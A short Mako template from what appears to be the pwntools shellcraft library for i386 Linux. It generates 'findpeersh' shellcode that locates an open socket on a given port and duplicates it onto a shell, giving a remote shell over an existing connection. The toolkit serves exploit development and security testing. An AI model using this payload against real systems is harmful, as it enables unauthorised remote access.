<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft.i386 import linux %>
<%page args="port = None"/>
<%docstring>
Args: port (defaults to any)
    Finds an open socket which connects to a specified
    port, and then opens a dup2 shell on it.
</%docstring>


${linux.findpeer(port)}

${linux.dupsh("esi")}

